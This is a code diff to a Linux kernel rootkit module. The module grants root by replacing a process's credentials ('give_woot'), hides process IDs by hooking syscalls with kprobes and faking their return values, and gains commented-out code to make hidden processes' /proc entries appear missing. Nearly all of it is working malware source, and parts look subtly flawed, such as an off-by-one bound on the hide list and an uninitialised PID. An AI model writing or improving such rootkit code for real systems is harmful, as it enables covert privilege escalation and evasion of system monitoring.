@@ -8,6 +8,7 @@
 #include <linux/sched.h>
 #include <linux/sched/signal.h>
 #include <linux/signal.h>
+#include <linux/slab.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("ceald");
@@ -101,7 +102,10 @@ void give_woot(pid_t target_pid) {
   rcu_assign_pointer(task->cred, newcreds);
   rcu_read_unlock();
 }
-
+static unsigned long get_syscall_return_addr(struct pt_regs *regs) {
+  unsigned long *stack = (unsigned long *)regs->sp; // skip rest of system call
+  return *stack;
+}
 static bool is_hidden(pid_t pid) {
   int i;
   for (i = 0; i < 32; i++) {
@@ -113,33 +117,35 @@ static bool is_hidden(pid_t pid) {
 }
 
 static int monitor_handle(struct kprobe *p, struct pt_regs *regs) {
-  struct pt_regs *real_regs;
-  const char __user *user_filename;
-  char filename[256];
-  long bytes;
-  pid_t target_pid;
-
-  real_regs = (struct pt_regs *)regs->di;
-  user_filename = (const char __user *)real_regs->si;
-  bytes = strncpy_from_user(filename, user_filename, sizeof(filename) - 1);
-
-  if (bytes > 0) {
-    filename[bytes] = '\0';
-    if (sscanf(filename, "/proc/%d/", &target_pid) == 1) {
-      if (is_hidden(target_pid)) {
-        printk(KERN_INFO "Opening /proc file: %s by %s (PID: %d)\n", filename,
-               current->comm, current->pid);
-      }
-    }
-  }
+  //  struct pt_regs *real_regs;
+  //  const char __user *user_filename;
+  //  char filename[256];
+  //  long bytes;
+  //  pid_t target_pid;
+  //
+  //  real_regs = (struct pt_regs *)regs->di;
+  //  user_filename = (const char __user *)real_regs->si;
+  //  bytes = strncpy_from_user(filename, user_filename, sizeof(filename) - 1);
+  //  int len = snprintf(NULL, 0, "%d", target_pid);
+  //  char *target_pid_str = kmalloc(len + 1, GFP_KERNEL);
+  //  snprintf(target_pid_str, len + 1, "%d", target_pid);
+  //
+  //  if (bytes > 0) {
+  //    filename[bytes] = '\0';
+  //    if (strstr(filename, target_pid_str) != NULL) {
+  //      if (is_hidden(target_pid)) {
+  //        printk(KERN_INFO "Opening /proc file: %s by %s (PID: %d)\n",
+  //        filename,
+  //               current->comm, current->pid);
+  //        regs->ax = -ENOENT;
+  //        regs->ip = get_syscall_return_addr(regs);
+  //      }
+  //    }
+  //  }
 
   return 0;
 }
 
-static unsigned long get_syscall_return_addr(struct pt_regs *regs) {
-  unsigned long *stack = (unsigned long *)regs->sp; // skip rest of system call
-  return *stack;
-}
 static struct kprobe kp[2];
 
 static int haha_funny_number(struct kprobe *p, struct pt_regs *regs) {
@@ -193,8 +199,9 @@ static int haha_funny_number(struct kprobe *p, struct pt_regs *regs) {
     }
     printk(KERN_INFO "hiding: %d\n", kill_this_pid);
     if (HIDE_ME_COUNT < 33) {
-      printk(KERN_INFO "cannot hide anymore!\n");
       HIDE_ME[HIDE_ME_COUNT++] = kill_this_pid;
+    } else {
+      printk(KERN_INFO "cannot hide anymore!\n");
     }
     regs->ax = 0;
     regs->ip = get_syscall_return_addr(regs);
